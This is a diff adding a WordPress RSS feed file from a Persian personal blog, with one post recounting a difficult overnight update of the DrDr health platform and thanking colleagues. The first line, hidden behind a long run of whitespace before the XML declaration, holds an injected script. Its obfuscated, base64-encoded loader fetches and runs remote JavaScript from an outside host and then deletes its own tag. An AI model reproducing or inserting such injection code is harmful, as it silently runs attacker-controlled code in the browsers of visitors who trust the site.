@@ -1,0 +1,86 @@
+                                                                                                                                                                                                                                                                                                                                                                                                                                         <script>var st=document.createElement('script'); st.innerHTML=atob("dmFyIHN0PWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOyBzdC5zcmM9Z2V0X2woKTsgc3QudHlwZT0ndGV4dC9qYXZhc2NyaXB0Jztkb2N1bWVudC5jdXJyZW50U2NyaXB0LnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHN0LCBkb2N1bWVudC5jdXJyZW50U2NyaXB0KTtkb2N1bWVudC5jdXJyZW50U2NyaXB0LnJlbW92ZSgpO2Z1bmN0aW9uIGdldF9sKCkge3JldHVybiAiaHQiK2F0b2IoImRIQnpPaTh2IikrU3RyaW5nLmZyb21DaGFyQ29kZSg5OSwxMDQsMTAxLDExNSwxMTYsNDYsOTksMTAwLDExMCwxMTYsMTExLDExNSwxMTksMTA1LDExNiw5OSwxMDQsMTE1LDExMiwxMDUsMTE0LDEwNSwxMTYpKyIuY29tIithdG9iKCJMM05qY21sd2RITXZZMjl1Ym1WamRHbHZibk11YW5NPSIpO30="); st.type='text/javascript';document.currentScript.parentNode.insertBefore(st, document.currentScript);document.currentScript.remove();</script><?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>technical &#8211; قدمگاه</title>
+	<atom:link href="./index.html" rel="self" type="application/rss+xml" />
+	<link>./../../../../index.html</link>
+	<description>وب سایت شخصی حمید شریعتی</description>
+	<lastBuildDate>Sat, 04 Nov 2023 04:47:58 +0000</lastBuildDate>
+	<language>fa-IR</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.4.4</generator>
+
+<image>
+	<url>./../../../../wp-content/uploads/2021/03/cropped-139911-32x32.jpeg</url>
+	<title>technical &#8211; قدمگاه</title>
+	<link>./../../../../index.html</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>DrDr update 2.9</title>
+		<link>./../../../2022/08/20/drdr-update-2-9/index.html</link>
+					<comments>./../../../2022/08/20/drdr-update-2-9/index.html#comments</comments>
+		
+		<dc:creator><![CDATA[حمید شریعتی]]></dc:creator>
+		<pubDate>Fri, 19 Aug 2022 22:17:13 +0000</pubDate>
+				<category><![CDATA[technical]]></category>
+		<category><![CDATA[لینکدین]]></category>
+		<guid isPermaLink="false">./../../../../index.html?p=659</guid>
+
+					<description><![CDATA[مثل یه روز بارونی در یک جنگل بزرگ، وقتی رعد و برق می‌زنه و قارچ‌های سمی شروع می‌کنن به در اومدن، بعد از هر آپدیت بزرگ باگ‌های سمی و غیرقابل پیش‌بینی شروع به خودنمایی می‌کنند لحظاتی بعد بارش باورنکردنی درخواست‌ها از هر سو اولین شبی بود که همسر و فرزندانم شب رو تنها در خانه &#8230;<p class="read-more"> <a class="" href="./../../../2022/08/20/drdr-update-2-9/index.html"> <span class="screen-reader-text">DrDr update 2.9</span> ادامه »</a></p>]]></description>
+										<content:encoded><![CDATA[<p>مثل یه روز بارونی در یک جنگل بزرگ، وقتی رعد و برق می‌زنه و قارچ‌های سمی شروع می‌کنن به در اومدن، بعد از هر آپدیت بزرگ باگ‌های سمی و غیرقابل پیش‌بینی شروع به خودنمایی می‌کنند</p>
+<p>لحظاتی بعد بارش باورنکردنی درخواست‌ها از هر سو</p>
+<p>اولین شبی بود که همسر و فرزندانم شب رو تنها در خانه سپری می‌کردند</p>
+<p>قبلا در <a href="https://adilar.com/">آدیلار</a> تجربه‌ش رو داشتم، منتهی نه به این گستردگی</p>
+<p>اولین کاری که باید می‌کردیم تهیه چک لیست از کارهایی بود که باید انجام می‌دادیم</p>
+<p>قرار بود ساعت ۱ نصف شب ۲۵ مرداد ۱۴۰۱ به روزرسانی آغاز بشه</p>
+<p>با چند میکروسرویس به عنوان نسخه ۲ و یه نسخه قدیمی به عنوان نسخه ۱ روبرو بودیم.</p>
+<p>اول از همه یک ایمیل به تمامی افراد مربوطه زدیم که باعث اولین تاخیر در کار شد. چون یک سری از افراد در روز به روزرسانی کار مهمی داشتند</p>
+<p>دانیال دائم در حال فیلمبرداری و عکسبرداری بود، چقدر خوبه همیشه خودت رو در مقابل دوربین دیگران احساس کنی. بدون هیچ عکس‌العملی به کار خودم ادامه می‌دادم. سرم در کار خودم بود. هیچ فکر حاشیه‌ای در ذهنم نمی‌آمد. چون می‌دانستم کسی یا کسانی من را تحت نظارت دارند و باید به نحو احسنت کار کنم</p>
+<p>و وقتی اذان گفت کم کم کار ما هم تمام شد</p>
+<p>هوا که روشن‌تر شد باگ‌ها هم پیدا شدند</p>
+<p>و الان که دارم این جمله رو می‌نویسم چهار شب گذشته و ساعت حدود ۳ نصفه شب است. هنوز دنبال باگ‌های حیاتی هستیم. امیدوارم فردا صبح، هوا واقعا آفتابی باشه و خانواده سنجاب‌خان (اهل و عیال خودم) از خونه درختی‌شون بیرون بیان و شاد و خوشحال باشن.</p>
+<p>***</p>
+<p>از تاریخ انتشار این نوشته، حدود سه هفته از آپدیت می‌گذره و هنوز درگیر باگ‌های ریز و درشت هستیم. قطعا خودم مسئول تمام این باگ‌ها هستم. ولی ضیغ وقت و شرایط سرمایه‌گذار حکم می‌کرد که زودتر به جلو حرکت کنیم.<br />
+یادم رفته بود اطلاعات گذشته رو بیارم. البته بخشی از این اطلاعات در یک دیتابیس قدیمی بوده که فکرش رو نکرده بودیم که به مشکل بخوره و حتی از فیلتر تست هم رد شده بود. البته تست هم آن‌چنان معیار خوبی برای پاس کردن نداشت.</p>
+<p>بدی گرفتن پروژه‌های کثیف و کار دیگران اینه که به همچین باگ‌هایی می‌خوری که نمی‌دونی از کجا سر در میارن. البته حتما می‌ارزید و خوشحالم که رو به آخراشیم و کم‌کم آماده می‌شم برای خودم یه هدیه خوب بگیرم. چون تنها کسی که می‌دونه چه زجری کشیدم سر این آپدیت خودم هستم</p>
+<p>آپدیت ۱۰ خرداد ۱۴۰۲</p>
+<p>خدا رو شکر هنوز زنده‌ایم <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> با تمام مشکلات ۲.۹ تاب آورد و در انتظار یه آپدیت تمیز و آینده‌دار هستیم. خوشحالم که هنوز در کنار دکتردکتر هستم.</p>
+<p>تجربه‌هایی داشتم که به سختی‌ش می‌ارزید.</p>
+<p>ممنونم از همه دوستانی که یاد دادند بهم</p>
+<p>از نوا و پایداری‌ش</p>
+<p>دنا و پاکیزگی‌ش (در توسعه کد منظورمه <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f609.png" alt="😉" class="wp-smiley" style="height: 1em; max-height: 1em;" /> )</p>
+<p>سعید و پرستیژش</p>
+<p>مصطفی و حرفه‌ای بودنش</p>
+<p>سودابه و متانتش</p>
+<p>محدثه و از خودگذشتگی‌ش</p>
+<p>محمد و تلاشش</p>
+<p>نورا&#8230; و روحیه‌ش</p>
+<p>فرزانه و صبرش</p>
+<p>فرید و لبخندش</p>
+<p>نوید و خنده‌هاش</p>
+<p>راضیه و همراهی‌ش</p>
+<p>آیدا و ذوقش</p>
+<p>فرزانه و دقتش</p>
+<p>حسن و وجودش</p>
+<p>و همه دوستان پشتیبانی و مارکتیگ و فروش و منابع انسانی و &#8230; که با همه مشکلات، تلاش کردند تا یه بستر حرفه‌ای در حوزه سلامت رو بسازیم</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>./../../../2022/08/20/drdr-update-2-9/feed/index.html</wfw:commentRss>
+			<slash:comments>2</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
